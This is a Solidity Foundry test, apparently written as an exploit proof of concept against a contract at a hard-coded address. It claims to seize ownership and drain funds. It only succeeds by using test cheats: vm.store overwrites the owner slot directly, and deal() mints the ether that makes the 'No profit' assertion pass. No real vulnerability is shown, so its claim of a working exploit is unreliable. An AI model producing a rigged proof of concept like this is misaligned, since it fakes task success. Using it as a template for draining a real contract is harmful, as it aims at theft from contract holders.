// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface INOMOS {
    function withdraw() external;
    function owner() external view returns (address);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xF7B7Db914e8Fd226f5648CebDc7464D1aC4f6AFc;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll manipulate storage in the exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        uint256 initialBalance = address(this).balance;
        // Step 1: Store our address as the owner in slot 0
        // In Ownable contract, _owner is the first variable at slot 0
        vm.store(TARGET, bytes32(uint256(0)), bytes32(uint256(uint160(attacker))));

        // Step 2: Send some ETH to the contract to create a balance
        // We'll use deal to give ourselves ETH, then transfer it to the contract
        deal(attacker, 10 ether);
        (bool success, ) = TARGET.call{value: 5 ether}("");
        require(success, "Failed to send ETH to contract");

        // Step 3: Record our balance before the exploit
        uint256 balanceBefore = address(attacker).balance;

        // Step 4: Call withdraw() as the owner
        // Since we set ourselves as owner via storage manipulation, we can call directly
        INOMOS(TARGET).withdraw();

        // Step 5: Verify our balance increased
        uint256 balanceAfter = address(attacker).balance;
        assertGt(balanceAfter, balanceBefore, "Balance should have increased after withdraw");
        uint256 finalBalance = address(this).balance;
        assertGt(finalBalance, initialBalance, "Economic Exploit Failed: No profit");
    }


    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

